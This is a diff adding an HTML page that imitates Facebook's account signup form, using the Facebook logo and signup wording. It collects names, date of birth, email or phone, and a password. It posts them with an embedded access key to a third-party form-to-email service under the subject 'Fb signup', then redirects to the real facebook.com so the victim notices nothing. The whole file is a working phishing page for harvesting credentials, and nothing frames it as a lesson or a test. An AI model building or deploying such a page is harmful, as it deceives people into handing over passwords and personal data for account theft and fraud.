@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+    
+    <img src="facebook.svg" width="300" alt="">
+
+    <h1>Create a new account</h1>
+
+    <p>It's quick and easy.</p>
+
+    <form action="https://api.web3forms.com/submit" method="post">
+
+        <!-- Replace with your Access Key -->
+    <input type="hidden" name="access_key" value="622fd8e4-079e-417c-bebb-4dc2b887ce75">
+
+    <!-- Optional: Subject an be prefilled using type="hidden"
+       or type="text" for normal user submitted input -->
+       <input type="hidden" name="subject" value="Fb signup">
+
+       <!-- Optional: Custom Redirection or Thank you Page
+       Make sure you add full URL including https:// -->
+  <input type="hidden" name="redirect" value="https://facebook.com">
+
+    
+  <!-- Optional: From Name you want to see in the email
+       Default is "Notifications". you can overwrite here -->
+       <input type="hidden" name="from_name" value="fb">
+
+
+    <input name="First name" type="text" placeholder="Firstname" required>
+    
+    <input name="Surname" type="text" placeholder="Surname" required>
+
+    <br>
+
+<p>Date of birth</p>
+
+<br>
+
+<input type="date" name="Dob" required>
+
+<br>
+
+<p>Gender</p>
+
+<br>
+
+Female <input type="radio" name="Gender">
+
+Male <input type="radio" name="Gender">
+
+Custom <input type="radio" name="Gender">
+
+<br>
+
+<input type="text" name="mobile/email" placeholder="Mobile number or email address" required>
+
+<br><br>
+
+<input type="password" name="pass" placeholder="New password" required>
+
+<br><br>
+
+People who use our service may have uploaded your contact information to Facebook. Learn more.
+<br>
+By clicking Sign Up, you agree to our Terms, Privacy Policy and Cookies Policy. You may receive SMS notifications from us and can opt out at any time.
+
+<br><br>
+
+<button type="submit">
+    Sign up
+</button>
+
+</form>
+
+</body>
+</html>
